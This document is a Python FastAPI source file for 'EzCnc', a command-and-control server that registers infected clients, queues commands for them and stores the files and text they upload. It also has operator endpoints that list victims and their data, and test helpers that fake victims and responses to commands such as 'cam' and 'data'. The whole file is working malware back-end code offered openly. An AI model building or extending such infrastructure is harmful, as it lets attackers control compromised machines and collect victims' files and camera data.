from typing import Any
from fastapi import FastAPI, File, UploadFile
from Structs import Client, Command, CommandRequester, ClientResponse
from Database import DB, Plots
import os
from faker import Faker
from faker.providers import internet
from loguru import logger
import uvicorn
from icecream import ic


import random

fake = Faker()
fake.add_provider(internet)


class CNC:
    def __init__(
        self,
        db_name: str = "Database.db",
        debug: bool = True,
        name: str = "EzCnc",
        logs_path: str = "EzCnc_logs.logs",
    ):
        self.debug = debug
        self.Database = DB(db_name)
        self.plots = Plots(self.Database)
        logger.add(f"{logs_path}.logs")
        self.api = FastAPI(debug=debug, title=name)

        @self.api.post("/api/client/identify", status_code=200)
        def identify(client: Client):
            if self.Database.new_client(client):
                return {"Status": True}
            else:
                return {"Status": False}

        @self.api.post("/api/cnc/command", status_code=200)
        def newcommand(command: Command):
            ic(command)
            if self.Database.new_command(command):
                return {"Status": True}
            else:
                return {"Status": False}

        @self.api.post("/api/client/command", status_code=200)
        def is_commanded(Requester: CommandRequester):
            response = self.Database.iscommanded(Requester)
            if response:
                return {"Status": True, "Data": response}
            else:
                return {"Status": False}
            

        @self.api.post("/api/client/response/file", status_code=200)
        def client_response_file(file: UploadFile, UUID: str,command:str):
            try:
                self.Database.insert_file(file, str(UUID),command=command)
                return {"Status": True}
            except Exception as e:
                logger.error(str(e))
                return {"Status": False}
            
        @self.api.get("/api/client/get_latest_file_path/{uuid}",status_code=200)
        def latestfilepath(uuid:str):
            try:
                path = self.Database.get_latest_path(self.Database.uuid_to_id(uuid))
                return {"Status":True,"path":str(path)}
            except Exception as e:
                ic(e)
                return {"Status":False,"Error":str(e)}

        @self.api.get("/api/client/update_latest_file_path/{uuid}/{path}",status_code=200)
        def latestfilepath(uuid:str,path:str):
            try:
                ic(uuid,path)
                id = self.Database.uuid_to_id(uuid)
                ic(id)
                self.Database.update_latest_path(id,str(path))
                return {"Status":True,"path":path}
            except:
                return {"Status":False,"path":None}

        
        @self.api.post("/api/client/response/text", status_code=200)
        def client_response_text(resp: ClientResponse):
            try:
                self.Database.insert_response(resp)
                return {"Status": True}
            except Exception as e:
                logger.error(str(e))
                return {"Status": False}
        
        @self.api.get("/api/cnc/getallvictimsdata",status_code=200)
        def get_all_victims():
            try:
                data = self.Database.return_all_victims_data()
                return {"Status":True,"data":data}
                
            except:
                return {"Status":False,"data":None}
            
        @self.api.get("/api/cnc/getalluuids",status_code=200)
        def get_all_uuids():
            try:
                data = self.Database._return_all_uuids()
                return {"Status":True,"data":data}
                
            except:
                return {"Status":False,"data":None}

        
        @self.api.get("/api/cnc/getallusernames",status_code=200)
        def get_all_usernames():
            try:
                data = self.Database.return_all_victims_names()
                return {"Status":True,"data":data}
                
            except:
                return {"Status":False,"data":None}
                
        @self.api.get("/api/cnc/uuidtoname/{uuid}",status_code=200)
        def uuid_to_name(uuid:str):
            try:
                name = self.Database.uuid_to_name(str(uuid))
                return {"Status":True,"data":name}
            except:
                return {"Status":False,"data":name}
        
        @self.api.get("/api/cnc/uuidtoid/{uuid}",status_code=200)
        def uuid_to_id(uuid:str):
            try:
                id = self.Database.uuid_to_id(uuid=uuid)
                return {"Status":True,"data":id}
            except:
                return {"Status":True,"data":None}

        @self.api.get("/api/cnc/latest_response/{id}/{time}",status_code=200)
        def latest_response(id:int,time:int):
            try:
                latest_response = self.Database.get_latest_responses(id=id,time=time)
                return {"Status":True,"data":latest_response}
            except:
                return{"Status":False,"data":None}
        
        @self.api.get("/api/cnc/changesentstatus/{status}/{responsetime}/{table}")
        def change_sent_status(status:int,responsetime:str,table:str):
            try:
                self.Database.change_sent_status(status=status,response_time=responsetime,table=table)
                return {"Status":True}
            except:
                return {"Status":False}
        
        @self.api.get("/api/cnc/getbyid/{id}")
        def get_by_id(id:int):
            try:
                user = self.Database.get_by_id(id)
                return {"Status":True,"data":user}
            except Exception as e:
                logger.error(e)
                return {"Status":False,"data":None}
        
        
        @self.api.get("/api/cnc/responses/{id}/{time}")
        def get_all_responses(id:int,time:int):
            try:
                table = self.Database.get_latest_responses(id,time=time)
                ic(table)
                return {"Status":True,"data":table}
            except Exception as e:
                logger.error(e)
                return {"Status":False,"data":None}
            
    
    def _GENERATE_FAKE_CLIENTS(self):
        latitude = fake.latitude()
        longitude = fake.longitude()
        location = f"{latitude}, {longitude}"

        return Client(
            uuid=fake.uuid4(),
            name=fake.name(),
            ip=fake.ipv4(),
            country=fake.country(),
            location=location,
        )
    
    def generate_fake_clients(self, count: int = 10):
        for i in range(count):
            self.Database.new_client(self._GENERATE_FAKE_CLIENTS())

    def generate_fake_responses(self):
        commands = ["cam", "data", "time", "ip"]
        if len(self.Database._return_all_uuids()) > 0:
            for uuid in self.Database._return_all_uuids():
                response = ClientResponse(
                    uuid=str(uuid[0]),
                    command=str(random.choice(commands)),
                    response=str(random.choice(["", "RESPONSE"])),
                    result=random.choice([0, 1]),
                )
                self.Database.insert_response(resp=response)
